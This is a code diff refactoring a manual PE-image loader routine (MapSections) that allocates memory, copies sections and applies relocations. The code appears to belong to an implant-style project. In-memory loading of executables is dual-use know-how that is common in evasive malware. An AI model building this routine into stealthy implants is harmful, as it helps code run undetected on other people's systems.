@@ -290,14 +290,11 @@ namespace Objects {
         return success;
     }
 
-    BOOL MapSections(PLOADMODULE module) {
+    BOOL MapSections(PEXECUTABLE module) {
         HEXANE;
 
-        auto image          = CreateImageData(module->buffer);
-        auto region_size    = (size_t) image->nt_head->OptionalHeader.SizeOfImage;
-
-        auto nt_head        = image->nt_head;
-        auto pref_base      = image->nt_head->OptionalHeader.ImageBase;
+        auto region_size    = (size_t) module->nt_head->OptionalHeader.SizeOfImage;
+        auto pref_base      = module->nt_head->OptionalHeader.ImageBase;
 
         module->base = pref_base;
 
@@ -305,26 +302,26 @@ namespace Objects {
             module->base != pref_base) {
 
             module->base = 0;
-            region_size = image->nt_head->OptionalHeader.SizeOfImage;
+            region_size = module->nt_head->OptionalHeader.SizeOfImage;
 
             if (!NT_SUCCESS(ntstatus = ctx->memapi.NtAllocateVirtualMemory(NtCurrentProcess(), (PVOID*) &module->base, 0, &region_size, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE))) {
                 return false;
             }
         }
 
-        for (DWORD i = 0; i < nt_head->OptionalHeader.SizeOfHeaders; i++) {
+        for (DWORD i = 0; i < module->nt_head->OptionalHeader.SizeOfHeaders; i++) {
             B_PTR(module->base)[i] = module->buffer[i];
         }
 
-        for (DWORD i = 0; i < nt_head->FileHeader.NumberOfSections; i++, image->section++) {
-            for (DWORD j = 0; j < image->section->SizeOfRawData; j++) {
+        for (DWORD i = 0; i < module->nt_head->FileHeader.NumberOfSections; i++, module->section++) {
+            for (DWORD j = 0; j < module->section->SizeOfRawData; j++) {
 
-                (B_PTR(module->base + image->section->VirtualAddress))[j] = (module->buffer + image->section->PointerToRawData)[j];
+                (B_PTR(module->base + module->section->VirtualAddress))[j] = (module->buffer + module->section->PointerToRawData)[j];
             }
         }
 
-        ULONG_PTR base_offset           = module->base - pref_base;
-        PIMAGE_DATA_DIRECTORY relocdir  = &nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
+        ULONG_PTR base_offset = module->base - pref_base;
+        PIMAGE_DATA_DIRECTORY relocdir  = &module->nt_head->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
 
         // if non-zero rva and relocdir exists...
         if ((module->base - pref_base) && relocdir) {
@@ -348,7 +345,7 @@ namespace Objects {
             } while (reloc->VirtualAddress);
         }
 
-        image->nt_head->OptionalHeader.ImageBase = module->base; // set the prefered base to the real base
+        module->nt_head->OptionalHeader.ImageBase = module->base; // set the prefered base to the real base
         return true;
     }
 
